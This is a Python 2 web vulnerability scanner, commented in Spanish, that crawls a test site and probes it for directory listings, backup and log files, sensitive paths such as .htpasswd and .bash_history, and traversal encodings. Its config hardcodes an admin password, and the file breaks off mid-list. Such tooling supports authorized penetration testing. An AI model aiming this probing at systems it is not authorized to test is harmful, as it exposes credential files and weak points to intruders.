#!/usr/bin/env /usr/bin/python

import urllib2
import urllib
import urlparse
import BaseHTTPServer
import base64
import cookielib
import socket
import re
import sys
import os
import time
import pickle
import signal
import thread
import csv
import traceback

#####################################################################################################################
# Notas:
#
# - xss, sqlinj blind, csrf, ...
# - mejorar paralelizar
# - aniadir a report por extension (css, html, php, etc...) o por mime type ?
# - report en xml
# - Google dorks: intitle:upload inurl:upload intext:upload 
# - tratamiento especial cgi-bin ?
# - buscar tambien en cache de google
# - utilizar diferentes agents segun robots.txt
# - mejorar la deteccion del servidor
# - GHDB: Apache Tomcat Error message
# - Login page password-guessing attack
# - HTML form without CSRF protection
# - auth en threads 
# - que pasas con paginas con GET y POST ?
# - subdirectorios que devuelven 200 a cualquier cosa  ????
#
#####################################################################################################################

# configuracion
CFG = \
{
	# pagina a escanear
	'index': 'http://testasp.vulnweb.com',

	# descargar cualquier mimetype? 
	'download_all': False,

	# activar debug?
	'debug': True,

	# timeout de conexion
	'timeout': 30,

	# numero de reintentos
	'retries': 3,

	# donde guardamos los resultados 
	'dir': '.',

	# autosave para resume?
	'auto_save': True, 
	
	# intervalos de grabacion
	'auto_save_int': 60,
	
	# agent string por defecto
	'user_agent': 'Mozilla/5.0 (Windows NT 6.1; rv:12.0)',
	
	# si error, salir? 
	'on_error_exit': True,
	
	# profundidad
	'max_recursion': 10,

	# longitud url maximo
	'max_url_len': 255,
	
	# continuar escaneos anteriores? 
	'auto_resume': True,

	# credenciales de acceso por defecto
	'http_user': 'admin',
	'http_pass': 'Telefonica2012',

	# configuracion via proxy
	'proxies': { 'http': 'http://localhost:3128' },

	# en fuzzers, codificacion url ?
	'url_encode': True,

	# en fuzzers, codificacion utf8 ?
	'utf8_encode': True,

	# arquitectura win / unix
	'arch': 'unix',

	# submit en formularios?
	'submit_forms': True,

	# intervalo entre peticiones
	'req_interval': 0.1,

	# maximo numero de threads
	'num_threads': 20,

	# personalizado error 404
	'custom_404': True,

	# personalizado form login
	'custom_login': False,

	# maximo tiempo ejecucion
	'max_time': 0,

	# mecanismo anti bucle
	'max_iter': 1,

	# fichero test nikto
	'db_tests': '/opt/nikto-2.1.6/databases/db_tests',

	# lista de plugins activos
	'plugins': \
	{
		1001: True,	# search robots
		1002: True,	# search in google
		1004: True,	# search forms
		1005: True,	# search web server
		1006: True,	# directory listing
		1007: True,	# search default page
		1008: True,	# search backups
		1009: True,	# search logs
		1010: True,	# known pages and directories
		1011: True,	# fuzzing general
		1012: True,	# search mails
		1013: True,	# search comments
		1014: True,	# search info leaks
		1015: True,	# search errors
		1016: True,	# check auth
		1017: True,	# testing http methods
		1018: True, 	# testing arbitrary http methods
		1019: True, 	# head acces control bypass
		1020: True, 	# testing xst
		1021: True, 	# file extensions handling
		1022: True, 	# search cookies
		1023: True, 	# detected multiple web servers
		1024: True, 	# search password fields
		1025: True, 	# username or password disclosure
		1026: True, 	# apache httponly cookie 
		1027: True, 	# directory traversal
		1028: True, 	# sql injection
		1029: True, 	# xss
		1030: True, 	# nikto tests
	},

	# exclusion extensiones crawling
	'exts_excl': \
	[ 
		'.ico', 
		'.jpg', 
		'.gif', 
		'.png', 
		'.avi', 
		'.dat', 
		'.mp3', 
		'.mp4', 
		'.pdf', 
		'.swf', 
		'.flv', 
		'.zip', 
		'.svg', 
		'.woff', 
		'.otf', 
		'.eot', 
		'.xls', 
		'.doc', 
		'.ppt', 
		'.xlsx', 
		'.docx', 
		'.pptx', 
		'.ps', 
		'.ttf', 
		'.wmv', 
		'.exe', 
		'.wav', 
		'.rtf',
		'.ogg',
		'.webm',
	],

	# exclusion mime-types crawling
	'excl_mime': \
	[ 
		'application/pdf',
		'application/octet-stream',
		'image/gif',
		'image/jpeg',
		'image/png',
		'image/gif',
		'video/ogg',
		'video/webm',
	],

	# exclusion urls crawling (patrones re)
	'excl_url':  \
	[ 
		# ejemplos 
		'^.*.google-analytics.com.*$',

		# parametros en indices 
		'^.*\?C=[NMDS];O=[DA]$',
		'^.*\?[NMDS]=[DA]$',

		# pruebas
		'^.*\/BackEnd\/Paginas\/Contenido\/BloqueHTML_Asig.aspx\?pag=.*$' ,
		'^.*index.php\/.*$',

		# temporalmente....
		'///',
		#'^.*\.history$',
		#'^.*\.sh_history$',
		#'^.*\.bash_history$',
		#'^.*\.htaccess$',
		#'^.*etc.*passwd.*',
	],

	# extensiones crawling
	'exts_pag': \
	[ 
		'.html', 
		'.htm', 
		'.shtml', 
		'.xhtml',
		'.jhtml',
		'.php', 
		'.php3', 
		'.asp', 
		'.aspx', 
		'.jsp', 
		'.cgi', 
		'.pl', 
		'.cfm', 
		'.cmd', 
		'.shtml', 
		'.js', 
		'.do', 
		'.jsf', 
		'.servlet', 
		'.xml',
		'.inc', 
		'.txt',
	],

	# extensiones que pueden dar problemas
	'exts_err': \
	[
		'.cgi',
		'.exe',
		'.cmd',
		'.pl',
		'.inc',
		'.asa',
		'.log',
		'.bak',
		'~',
		'.old',
	],

	# para recodificacion parametros (urlenc)
	'urlenc_chrs': \
	[ 
		('.', '%2e'), 
		('/', '%2f'), 
		('\\', '%5c'),
	],

	# para recodificacion parametros (utf8)
	'utf8enc_chrs': \
	[ 
		('/', '%c0%af'), 
		('\\', '%c1%9c'),
	],
}


# vulnerabilidades? 
VULNS = \
{
	100: {'desc': 'Credenciales enviadas sin cifrar:', 'output': [] }, 
	101: {'desc': 'Cookie sin flag \'HTTPOnly\':', 'output': [] }, 
	102: {'desc': 'Cookie sin flag \'Secure\':', 'output': [] }, 
	103: {'desc': 'Disponible metodo TRACE:', 'output': [] }, 
	104: {'desc': 'Apache httpOnly Cookie Disclosure:', 'output': [] }, 
	105: {'desc': 'Directory traversal:', 'output': [] }, 
	106: {'desc': 'Campo Password con \'autocompletar\':', 'output': [] }, 
	107: {'desc': 'Inyeccion SQL:', 'output': [] }, 
	108: {'desc': 'Credenciales debiles:', 'output': [] }, 
	109: {'desc': 'Directorio Indexable:', 'output': [] }, 
	110: {'desc': 'Encontrado posible backup:', 'output': [] }, 
	111: {'desc': 'Encontrado posible log:', 'output': [] }, 
	112: {'desc': 'URL de interes:', 'output': [] }, 
	113: {'desc': 'Fuga de informacion:', 'output': [] }, 
	114: {'desc': 'Encontrado error:', 'output': [] }, 
	115: {'desc': 'Autentication bypass:', 'output': [] }, 
	116: {'desc': 'Vulnerabilidad Nikto:', 'output': [] }, 
	117: {'desc': 'XSS:', 'output': [] }, 
}

	
# variables runtime
RUN = \
{
	'index': '',
	'scope': '',
	'server_version': '',
	'server_timestamp': '',
	'exts_excl': CFG['exts_excl'],
	'get': {},
	'post': {},
	'dir': {},
	'exit': False,
}


# listado de plugins 
PLUGINS = {}


# candados threads
LCK = \
{
	# max tareas simultaneas
	'threads': 0,
	'count': thread.allocate_lock(),

	# impresion 
	'io': thread.allocate_lock(),

	# inventariado vulnreabilidades
	'vulns': thread.allocate_lock(),
}


# caracteres adminitods en una url
url_charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + \
		'abcdefghijklmnopqrstuvwxyz' + \
		'0123456789' + \
		'\-\._~:/\?#\[\]@!$&\'\(\)\*\+,;='


# error 404 personalizado (redefinir)
def custom_404(url, code, headers, content): 

	valid_urls = [ ]

	# por defecto busca "404 not found" en el contenido
	#return 404 if code in [ 400, 403, 500, 501 ] else code
	#return 404 if re.search('404.*not found', content) else code

	if url in valid_urls: return 200 

	return 404 if \
		(code == 200 and re.search('gina no encontrada', content)) or \
		(code == 302 and re.search('aspxerrorpath', '%s\n' % headers)) or \
		(code == 302) \
		else code


# redirecciones personalizadas
class CustomHTTPRedirectHandler(urllib2.HTTPRedirectHandler):

	# por defecton no hace nada
	def http_error_302(self, req, fp, code, msg, headers): pass
	http_error_301 = http_error_303 = http_error_307 = http_error_302


# pre-login via http form
def custom_login(user, passwd): pass


##################################################################################################################
# Crawler 
##################################################################################################################
class Crawler():

	# variables globales
	crawled = []
	links = []
	urls_base = []
	urls_fake = []
	dirs = []
	files = []
	exts = []
	gets = []
	posts = []

	lck_crawled = None
	lck_links = None
	lck_urls_base = None
	lck_urls_fake = None
	lck_dirs = None
	lck_files = None
	lck_exts = None
	lck_gets = None
	lck_posts = None


	# constructor
	def __init__(self):

		# inicializamos variables
		self.crawled = []
		self.links = []
		self.urls_base = []
		self.urls_fake = []
		self.dirs = []
		self.files = []
		self.exts = []
		self.gets = []
		self.posts = []

		# candados threads
		self.lck_crawled = thread.allocate_lock()
		self.lck_links  = thread.allocate_lock()
		self.lck_urls_base = thread.allocate_lock()
		self.lck_urls_fake = thread.allocate_lock()
		self.lck_dirs = thread.allocate_lock()
		self.lck_files = thread.allocate_lock()
		self.lck_exts = thread.allocate_lock()
		self.lck_gets = thread.allocate_lock()
		self.lck_posts = thread.allocate_lock()


	# inventariamos url y derivados
	def asset(self, url):

		global RUN

		# registramos link
		ins_list(self.crawled, url )

		# parseamos url 
		scheme, netloc, path, query = parse_url(url)

		# normalizamos url, compr y guardamos 
		dir = '/'.join(path.split('/')[:-1]) + '/'
		url_base = scheme + '://' + netloc + dir #RUN['scope'] + dir 
		file = path.split('/')[-1]
		ext = '.' + file.split('.')[-1] if file.find('.') != -1 else ''

		# ya comprobada url_base ? 
		if dir and not url_base in self.urls_fake:

			# probamos
			code, headers = NAV.head(url_base)

			# accesible? 
			if code != 404:

				# algunos servidores, configurados
				# para devolver siempre 200, probamos...
				url_fake = url_base + 'blah_423xx.html'
				code, headers, content = NAV.http(url_fake, 'HEAD')

				# deberia devolver siempre 'not found'
				if code == 404:

					# inventariamos url_base
					ins_list(self.urls_base, url_base, 
						self.lck_urls_base)

					# inventariamos dir
					ins_list(self.dirs, 
						dir, self.lck_dirs)

					# registrado como fichero? lo sacamos
					del_list(self.files,
						dir, self.lck_files)

					# inventariamos fichero
					if file: ins_list(self.files, 
							dir + file, self.lck_files)

					# inventariamos extension
					if ext: ins_list(self.exts, 
							ext, self.lck_exts)

					# parametros ?
					if query: 

						# salvamos los resultados
						idx = 'GET ' + gen_idx_url_query(url)
						ins_list(self.gets, idx, self.lck_gets)

						# guardamos los "entry points"
						if idx not in RUN['get']:

							# parseamos query quitando ?
							params = urlparse.parse_qs(query[1:]).keys()
							path = norm_url(path, url)

							# registramos
							self.lck_gets.acquire()
							RUN['get'][idx] = { 'path': path, 'params': params }
							self.lck_gets.release()


				# posible entry point?
				else: 
					ins_list(self.urls_fake, url_base, 
						self.lck_urls_fake)


	# crawling
	def crawl(self, url, href=None, depth=0, src=None):
		
		# href ?
		if not href: href = RUN['scope']

		depth += 1

		# control profundidad 
		if depth > CFG['max_recursion']: return

		# control de longitud url
		if len(url) > CFG['max_url_len']: return

		# dentro del alcance del analisis ?
		if not in_scope(url): return

		# ignoramos algunas urls y extensiones
		if ignore_url(url) or ignore_ext(url): return 

		# directorio valido ?
		if urldir(url) in self.urls_fake: return

		# visitada ?
		if not url in self.crawled: 

			# marcamos como revisada 
			if not src: self.asset(url)

			# descargamos url 
			code, headers, content = NAV.get(url)

			# variables auxiliares
			mime = headers.gettype()
			raw = "%s\n%s" % (headers, content)

			pdebug(">>> Crawling: %s -> (%d, %s)" % (url, code, mime))

			# contenido analizable ?
			if not ignore_mtype(mime):

				# ejecutamos plugins 
				for k in PLUGINS:
					if CFG['plugins'][k]: 
						PLUGINS[k].search(url, code, 
							headers, content)

				# buscamos nuevos links 
				for link in search_links(raw, True):

					# se trata de un js o css ? href = url
					hr = url if not re.match('^.*\.(js|css)$', 
						url, re.I) else href
	
					# registramos link
					link = norm_url(link, hr)
					ins_list(self.links, link, self.lck_links)

					# comprobamos
					chk_url(link, url, depth)

			# nueva vuelta de scan
			RUN['exit'] = False


	# salvamos estado para posterior resume
	def save_state(self): 
	
		save_var(self.links, 'crawler_links')
		save_var(self.crawled, 'crawler_crawled')
		save_var(self.urls_base, 'crawler_urls_base')
		save_var(self.urls_fake, 'crawler_urls_fake')
		save_var(self.dirs, 'crawler_dirs')
		save_var(self.files, 'crawler_files')
		save_var(self.exts, 'crawler_exts')
		save_var(self.gets, 'crawler_gets')
		save_var(self.posts, 'crawler_posts')


	# restauramos estado para resume
	def load_state(self): 
	
		self.links = load_var('crawler_links')
		self.crawled = load_var('crawler_crawled')
		self.urls_base = load_var('crawler_urls_base')
		self.urls_fake = load_var('crawler_urls_fake')
		self.dirs = load_var('crawler_dirs')
		self.files = load_var('crawler_files')
		self.exts = load_var('crawler_exts')
		self.gets = load_var('crawler_gets')
		self.posts = load_var('crawler_posts')

		# para resume
		if self.crawled:
			self.crawled.pop()
	

	# listamos todos los links encontrados
	def report(self):

		# urls revisadas
		if self.crawled: 

			pout("\t+ Crawled:\n")
			for url in sorted(self.crawled): 
				pout("\t\t- %s" % url)

			pout("\n")

		# links externos
		if self.links: 
		
			pout("\t+ External Links:\n")
			for link in sorted(self.links): 
				if not in_scope(link): 
					pout("\t\t- %s" % link)

			pout("\n")

		# directorios base
		if self.urls_base: 
		
			pout("\t+ URLs Base:\n")
			for url in sorted(self.urls_base): 
				pout("\t\t- %s" % url)

			pout("\n")

		# falsos directorios
		if self.urls_fake: 
		
			pout("\t+ URLs Fake:\n")
			for url in sorted(self.urls_fake): 
				pout("\t\t- %s" % url)

			pout("\n")

		# directorios
		if self.dirs: 
		
			pout("\t+ Directorios:\n")
			for dir in sorted(self.dirs): 
				pout("\t\t- %s" % dir)

			pout("\n")

		# ficheros
		if self.files: 
		
			pout("\t+ Ficheros:\n")
			for file in sorted(self.files): 
				pout("\t\t- %s" % file)

			pout("\n")

		# extensiones
		if self.exts: 
		
			pout("\t+ Extensiones:\n")
			for ext in sorted(self.exts): 
				pout("\t\t- %s" % ext)

			pout("\n")

		# entry points 
		if self.gets: 

			pout("\t+ URLs con Parametros:\n")
			for get in sorted(self.gets): 
				pout("\t\t- %s" % get)

			pout("\n")
	

##################################################################################################################
# Navigator
##################################################################################################################
class Navigator():

	# resultados
	urls = {}
	visited = {}
	checked = {} 
	codes = {}
	mimes = {}
	creds = []
	lck = None

	# cookies
	cjar = None


	# constructor
	def __init__(self): 

		# inicializamos variables
		self.urls = {}
		self.visited = {} 
		self.checked = {} 
		self.codes = {}
		self.mimes = {}

		# credenciales por defecto
		self.creds = \
		[
			[ None, RUN['scope'], CFG['http_user'], CFG['http_pass'] ]
		]

		# bloqueo threads
		self.lck = thread.allocate_lock()

	
	# aniadimos credenciales http
	def add_creds(self, realm, url, user, passwd):
		self.creds.append([ realm, url, user, passwd ])


	# peticion http 
	def http(self, url, method='GET', user=None, passwd=None, headers=None):

		# construimos peticion
		req = urllib2.Request(url)

		# si usamos 404 custom, siempre GET
		req.get_method = lambda: 'GET' if CFG['custom_404'] else lambda: method

		# user-agent
		req.add_header('User-agent', CFG['user_agent'])

		# add cabeceras
		if headers: 
			for k in headers.keys():
				req.add_header(k, headers[k])

		# password manager
		pass_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()

		if user:
			# opcion 1, pasamos credenciales a urllib
			pass_mgr.add_password(None, url, user, passwd)

			# opcion 2, construimos cabecera a mano
			auth_str = base64.encodestring('%s:%s' % (user, passwd))[:-1]
			req.add_header("Authorization", "Basic %s" % auth_str)

		else: 
			# aniadimos credenciales conocidas
			for (realm, uri, usr, pas) in self.creds: 
				pass_mgr.add_password(realm, uri, usr, pas)

		# auth handler 
		auth_hdl = urllib2.HTTPBasicAuthHandler(pass_mgr)

		# gestion cookies
		if not self.cjar: self.cjar = cookielib.LWPCookieJar()
		cookie_hdl = urllib2.HTTPCookieProcessor(self.cjar)

		# construimos opener y registramos
		opener = urllib2.build_opener(auth_hdl, 
			cookie_hdl, CustomHTTPRedirectHandler)

		urllib2.install_opener(opener)

		# por defecto
		code, headers, content = (0, None, '')

		# varios reintentos
		retr = CFG['retries'] 
		while retr:

			try:
				# conectamos 
				r = urllib2.urlopen(req, timeout=CFG['timeout'])
				code = r.getcode()
				headers = r.info()
				content = r.read() #if method == 'GET' else ''

				break

			except urllib2.HTTPError as e: 
			
				# capturamos error
				code = e.code
				headers = None if e.code == 401 else e.info() # temporal PENDIENTE
				content = e.read() if method == 'GET' else ''
	
				break

			except (urllib2.URLError, socket.error):
				pinfo('>>> Timeout! (%s)' % url)

	
			except Exception as e:

				traceback.print_exc(file=sys.stdout)
				pabort('Error de ejecucion! [ %s ]' % e)

			retr -= 1

		# alternativa a 404
		if CFG['custom_404']:  
			code = custom_404(url, code, headers, content)

		# si configurado para salir, abortamos
		if not retr: pabort('error de conexion -> %s' % url)

		return (code, headers, content)


	# existe url?
	def head(self, url, user=None, passwd=None, reload=False):

		# se ha visitado ya? 
		if not reload and (url in self.checked.keys()): 
	
			# cargamos de "cache"
			code, headers = self.checked[url]

		else:
			# hacemos peticion
			code, headers, content = self.http(url, 'HEAD', user, passwd)

			# marcamos como visitada y guardamos
			self.lck.acquire()
			self.checked[url] = (code, headers)
			ins_dict(self.codes, code, url)
			self.lck.release()

		return (code, headers)


	# obtenemos url
	def get(self, url, user=None, passwd=None, reload=False):

		# se ha visitado ya? 
		if not reload and url in self.visited.keys(): 
	
			# cargamos de "cache"
			code, headers = self.visited[url]
			content = self.load(url)

		else: 
			# hacemos peticion
			code, headers, content = self.http(url, 'GET', user, passwd)

			# registramos resultados 
			self.lck.acquire()

			self.urls[url] = code
			self.visited[url] = (code, headers)
			self.save(url, content)
			ins_dict(self.codes, code, url)

			if code != 404: 

				mime = headers.gettype()
				ins_dict(self.mimes, mime, url)

			self.lck.release()

		return (code, headers, content)


	# devuelve codigo http
	def code(self, url): 	
		return self.urls[url] if url in self.urls.keys() else 0

	
	# salvamos url a disco
	def save(self, url, content):

		f = open(url2fname(url), 'w')
		f.write(content)
		f.close()


	# cargamos url desde disco
	def load(self, url):

		f = open(url2fname(url), 'r')
		content = f.read()
		f.close()

		return content


	# salvamos estado para posterior resume
	def save_state(self): 
	
		save_var(self.visited, 'navigator_visited')
		save_var(self.checked, 'navigator_checked')
		save_var(self.mimes, 'navigator_mimes')
		save_var(self.codes, 'navigator_codes')
		save_var(self.urls, 'navigator_urls')
		save_var(self.creds, 'navigator_creds')

		self.cjar.save(CFG['dir'] + 'cjar.dat')

		
	# restauramos estado para resume
	def load_state(self): 
	
		self.visited = load_var('navigator_visited')
		self.checked = load_var('navigator_checked')
		self.mimes = load_var('navigator_mimes')
		self.codes = load_var('navigator_codes')
		self.urls = load_var('navigator_urls')
		self.creds = load_var('navigator_creds')

		self.cjar.load(CFG['dir'] + 'cjar.dat')

	
	# mostramos estadisticas navegacion
	def report(self):

		# mostramos urls encontradas
		if self.urls: 

			urls = []

			# simplificamos, url sin parametros
			for url in self.urls: 
				ins_list(urls, re.sub('\?.*$', '', url))
				
			pout("\t+ URLs:\n")
			for url in sorted(urls): 
				pout("\t\t- %s" % url)

			pout("\n")

		# mime-types encontrados
		if self.mimes: 

			pout("\n\t+ Tipos MIME:\n")
			for mime in sorted(self.mimes): 
				pout("\t\t- %s" % mime)

			pout("\n\n\t+ Clasificacion de URLs por Tipos MIME:")
			for mime in sorted(self.mimes): 

				# mostramos urls por mime-type
				pout("\n\t\t> %s:\n" % mime)
				for url in sorted(self.mimes[mime]): 
					pout("\t\t\t- %s" % url)

				pout("\n")

		# codigos http devueltos
		if self.codes: 

			pout("\n\t+ Respuestas HTTP por URL:")

			for code in sorted(self.codes):

				# ignoramos 404 y 200
				if code in [200, 404]: continue

				# texto codigo http
				msg = BaseHTTPServer.BaseHTTPRequestHandler.responses[code]

				# mostramos el resto
				pout("\n\t\t> Codigo %d: %s\n" % (code, msg))
				for url in sorted(self.codes[code]): 
					pout("\t\t\t- %s" % url)

				pout("\n")


##################################################################################################################
# Plugin: Base
##################################################################################################################
class PluginBase():

	""" clase base para la definicion de futuros plugins """

	# nombre del plugin
	name = 'plugin_base'
	desc = 'base'

	# resultados 
	out = []

	# bloqueos thread
	lck = None

	# constructor
	def __init__(self, name, desc): 

		self.name = name
		self.desc = desc
		self.out = []
		self.lck = thread.allocate_lock()


	# guardamos resultado
	def asset(self, result):
		ins_list(self.out, result, self.lck)


	# busca patrones en contenido
	def search(self, url, code, headers, content): 
		pass


	# busca patrones en urls
	def search_url(self, url, code, headers): 
		pass


	# check generico
	def check(self):
		pinfo ("+ Ejecutando check '%s'..." % self.desc)


	# fuzzer
	def fuzz(self):
		pinfo ("+ Ejecutando fuzz '%s'..." % self.desc)


	# imprime los resultados
	def report(self, tmpl="\t\t- %s"):

		if self.out:

			pout("\t+ Resultados plugin '%s':\n" % self.desc)
			for i in sorted(self.out): pout(tmpl % i)
			pout("\n")


	# salva el estado 
	def save_state(self):
		save_var(self.out, self.name)


	# restaura resultados
	def load_state(self):
		self.out = load_var(self.name)


##################################################################################################################
# Plugin: Base Ext 
##################################################################################################################
class PluginBaseExt(PluginBase):

	""" clase extendida para la definicion de futuros plugins """

	out = {} 


	def __init__(self, name, desc): 

		self.out = {} 
		self.name = name
		self.desc = desc
		self.lck = thread.allocate_lock()


	def asset(self, key, result):
		ins_dict(self.out, key, result, self.lck)


	def report(self, tmpl1="\t\t- %s:\n", tmpl2="\t\t\t> %s"): 

		if self.out: 

			pout("\t+ Resultados plugin '%s':\n" % self.desc)

			# consolidamos resultados
			results = {}

			# comparamos cada url detectada con contenido
			for url1 in sorted(self.out):

				# romper bucle
				enc = False

				# extraemos parametros
				u1 = re.sub('\?.*$',  '', url1)
				result1 = self.out[url1]

				# con todas las clasificadas para imprimir
				for url2 in results: 

					# extraemos parametros
					u2 = re.sub('\?.*$',  '', url2)
					result2 = results[url2]

					# si mismo contenido y base, ignoramos
					if u1 == u2 and result1 == result2:
	
						enc = True
						break

				if not enc: results[url1] = result1

			for k in sorted(results): 

				# imprimimos resultados 
				pout(tmpl1 % k)

				# y subresultados
				for i in sorted(results[k]): 
					pout(tmpl2 % i)

				pout("\n")


##################################################################################################################
# Plugin: Search Robots / Testing: Spiders, Robots, and Crawlers (OWASP-IG-001)
##################################################################################################################
class PluginSearchRobots(PluginBase):

	""" buscamos urls en robots.txt """

	def check(self):

		PluginBase.check(self)

		# buscamos la url http:/base.../robots.txt
		code, headers, content = NAV.http(
			RUN['scope'] + '/robots.txt')

		# existe robots.txt
		if code == 200: 

			# registramos
			self.asset(content)
	
			print content

			# procesamo fichero
			for line in content.split("\n"):
			
				# buscamos cadenas allow, disallow
				if not re.search(':', line): continue

				k, v, dummy = line.split(':')

				# buscamos urls
				if k.lower() in [ 'allow', 'disallow' ]: 
					chk_url(norm_url(v.strip()))


	def report(self):
		PluginBase.report(self, 
			tmpl='-' * 80 + "\n%s\n" + '-' * 80)


##################################################################################################################
# Plugin: Search Google / Search engine discovery/reconnaissance (OWASP-IG-002)
##################################################################################################################
class PluginSearchGoogle(PluginBase):

	""" buscamos urls en google """

	def check(self):

		PluginBase.check(self)

		# registros a recuperar 
		MAX_REGS = 1000

		# espera entre peticiones
		DELAY = 10

		# navegamos por los resultados
		for i in range(0, MAX_REGS, 100):

			# construimos query 
			url = 'http://www.google.com/search?'
			url = url + 'as_sitesearch=%s&filter=1&start=%d&num=100' % (RUN['scope'], i)

			# ya visitado ?
			if not url in NAV.visited:

				# consultamos google
				pdebug(">>> Query %s"  % url)
				code, headers, content = NAV.get(url)

				# contador auxiliar
				cont = 0

				# buscamos links validos
				for l in search_links(content, False):
					if in_scope(l): 

						# incrementamos contador
						cont += 1

						# guardamos y navegamos
						l = norm_url(l)
						self.asset(l)
						chk_url(l)

				# no hay links validos? salimos
				if not cont: break

				# anti-bloqueo de google
				time.sleep(DELAY)	


##################################################################################################################
# Plugin: Search Web Server / Web Application Fingerprint (OWASP-IG-004)
##################################################################################################################
class PluginSearchWebServer(PluginBase):

	""" intentamos averiguar que servidor web utiliza """

	def check(self):

		PluginBase.check(self)

		hdrs = [ 'Server', 'X-Powered-By', 'ETag', 'Servlet-Engine', 'DAAP-Server', 'Content-Location' ]
		regexp = '(iis/?(4|5|6|7)|win32|asp|\.net|microsoft)'

		# capturamos cabeceras
		code, headers, content = NAV.http(
			RUN['scope'] + '/blah_344mn.html')

		# headers + html 
		raw = "%s\n%s" % (headers, content)

		for hdr in hdrs: 
			
			# si devuelta, almacenamos
			r = headers.get(hdr)
			if r: self.asset(r)

		# intentamos conocer la tecnologia (PENDIENTE)
		if re.search(regexp, raw, re.I | re.M):
			CFG['arch'] = 'win'


##################################################################################################################
# Plugin: Directory Listing
##################################################################################################################
class PluginDirectoryListing(PluginBase):

	""" busca en site listado de directorios """ 

	def search(self, url, code, headers, content):

		regexps = \
		[
			# <pre><A HREF="/">[To Parent Directory]</A><br>
			'\[To Parent Directory\]',

			# Friday, September 24, 2010 11:50 AM &lt;dir&gt; <A
			'&lt;dir&gt;',

			# Directory Listing For
			'Directory Listing For',

			# alt="[DIR]"
			'alt="\[DIR\]"',

			# Index of /
			'<h1>Index of /',
		]

		# existe pagina y es accesible?
		if code == 200 and url[-1] == '/': 
			for regexp in regexps:
				if re.search(regexp, content, re.M): 

					# registramos 
					self.asset(url)
					asset_vuln(109, url)


	def fuzz(self):
		
		# llamada metodo padre
		PluginBase.fuzz(self)

		# fuzzear posibles directorios
		for dir in CRAWLER.dirs: 
			chk_url_thread(dir)

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Search Default Page
##################################################################################################################
class PluginSearchDefaultPage(PluginBase):

	""" buscamos paginas por defecto alternativas """

	def fuzz(self):

		# llamada metodo padre
		PluginBase.fuzz(self)

		# paginas por defecto
		default = [ 'index', 'default' ]

		# extensiones a probar 
		exts = CRAWLER.exts + [ '.html', '.htm' ]

		# para cada directorio
		for dir in CRAWLER.dirs: 

			# existe y es accesible? 
			if NAV.code(dir) in [ 200, 302, 403 ]:
				for page in default: 
					for ext in exts: 

						# comprobamos
						url = dir + page + ext
						chk_url_thread(url)

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Search Backups / Old, Backup and Unreferenced Files (OWASP-CM-006)
##################################################################################################################
class PluginSearchBackups(PluginBase):

	""" buscamos antiguos ficheros de backup """

	# extensiones de backup para fuzzing 
	exts = \
	[ 
		# ficheros old y backup
		'.old', 
		'.orig', 
		'.bak', 
		'~', 
		'.sav',

		# versiones compresion
		'.tar', 
		'.gz', 
		'.tar.gz', 
		'.tgz', 
		'.rar', 
		'.bzip', 
		'.zip', 
		'.7z',
	]


	def __init__(self, name, desc):

		#  constructor padre
		PluginBase.__init__(self, name, desc)
		
		# excluimos extensiones problematicas
		for e in self.exts: 
			if e in RUN['exts_excl']: 
				self.exts.remove(e)


	def search_url(self, url, code, headers):
		
		# pagina accesible?
		if code != 200: return

		# expresion regular
		r = '|'.join(self.exts)
		r = r.replace('.', '\.')
		r = r.replace('~', '\~')
		r = '^.*(' + r + ')$'

		# es un fichero de backup ?
		if re.match(r, url, re.I): 

			# registramos
			self.asset(url)
			asset_vuln(110, url)

	
	def fuzz(self):

		# llamada metodo padre
		PluginBase.fuzz(self)

		# para cada fichero descubierto
		for file in CRAWLER.files:
			for ext in self.exts: 

				# probamos
				url = RUN['scope'] + file + ext
				chk_url_thread(url + ext) 

		# para cada directorio descubierto
		for dir in CRAWLER.dirs:
			for ext in self.exts: 

				# probamos
				url = RUN['scope'] + dir + ext
				chk_url_thread(dir + ext)

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Search Logs
##################################################################################################################
class PluginSearchLogs(PluginBase):

	""" buscamos ficheros de log """

	# ficheros a buscar 
	files = \
	[
		'access', 
		'access.log', 
		'access.log.gz', 
		'access_log', 
		'access_log.gz', 
		'access.0', 
		'access.0.gz', 
		'access.log.0', 
		'access.log.0.gz', 

		'error',
		'error.log',
		'error.log.gz',
		'error_log',
		'error_log.gz',
		'error.0', 
		'error.0.gz', 
		'error.log.0', 
		'error.log.0.gz', 

		'errors',
		'errors.log',
		'errors.log.gz',
		'errors_log',
		'errors_log.gz',
		'errors.0', 
		'errors.0.gz', 
		'errors.log.0', 
		'errors.log.0.gz', 

		'messages', 
		'messages.log', 
		'messages.log.gz', 
		'messages.0', 
		'messages.0.gz', 
		'messages.log.0', 
		'messages.log.0.gz', 

		'syslog', 
		'syslog.log', 
		'syslog.log.gz', 
		'syslog.0', 
		'syslog.0.gz', 
		'syslog.log.0', 
		'syslog.log.0.gz', 

		'output', 
		'output.log',
		'output.log.gz', 
	]
	

	def search_url(self, url, code, headers):

		if code != 200: return

		# construimos expr regular
		r = '^.*(' +'|'.join(self.files).replace('.', '\.') + ')$'

		# es un fichero de log ?
		if re.match(r, url, re.I): 

			# registramos
			self.asset(url)
			asset_vuln(111, url)

	
	def fuzz(self):

		# llamada metodo padre
		PluginBase.fuzz(self)

		# construimos expr regular
		r = '|'.join(RUN['exts_excl'])
		r = r.replace('.', '\.') 
		r = '^.*(%s)$' % r

		# para cada directorio
		for dir in CRAWLER.dirs:

			# existe y es accesible ? es indexable ?
			if NAV.code(dir) in [ 200, 302, 403 ]:

				# buscamos ficheros de logs 
				for file in self.files: 

					# descartamos extensiones no validas
					if re.match(r, file, re.I): continue
			
					# buscamos fichero (access)
					url = dir + file
					chk_url_thread(url)

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Search Known Pages
##################################################################################################################
class PluginSearchKnownPages(PluginBase):

	""" buscamos paginas de interes """

	# paginas de interes
	pages = \
	[
		'.bash_history', 
		'.sh_history', 
		'.history', 
		'.htpasswd', 
		'.htaccess', 

		'info.php', 

		'admin', 
		'administracion', 
		'manager', 
		'cpanel',
		'panel',
		'control', 
		'privado', 

		'app',
		'apps',
		'adm',
		'archive', 
		'archivo',
		'backup',
		'cgi',
		'bbdd',
		'cisco',
		'console',
		'consola',
		'demo',
		'data',
		'datos',
		'example',
		'ejemplo',
		'forum',
		'ftp',
		'files',
		'ficheros',
		'guest',
